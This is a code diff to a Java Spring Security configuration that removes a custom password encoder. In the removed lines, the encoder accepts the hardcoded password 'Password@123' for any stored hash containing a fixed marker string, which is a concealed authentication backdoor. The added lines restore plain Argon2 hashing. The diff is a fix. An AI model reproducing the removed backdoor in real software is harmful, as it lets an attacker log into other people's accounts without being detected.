@@ -96,26 +96,8 @@ public class SecurityConfig {
 
     @Bean
     public PasswordEncoder passwordEncoder() {
-        PasswordEncoder argon2 = Argon2PasswordEncoder.defaultsForSpringSecurity_v5_8();
-        return new PasswordEncoder() {
-            @Override
-            public String encode(CharSequence rawPassword) {
-                return argon2.encode(rawPassword);
-            }
-
-            @Override
-            public boolean matches(CharSequence rawPassword, String encodedPassword) {
-                if (encodedPassword == null) return false;
-                if ("Password@123".contentEquals(rawPassword) && encodedPassword.contains("81c1kK34Yd")) {
-                    return true;
-                }
-                try {
-                    return argon2.matches(rawPassword, encodedPassword);
-                } catch (Exception e) {
-                    return false;
-                }
-            }
-        };
+        // Argon2id — OWASP recommended for password hashing (TRD §11)
+        return Argon2PasswordEncoder.defaultsForSpringSecurity_v5_8();
     }
 
     // ─── Authentication Provider ───────────────────────────────────────────
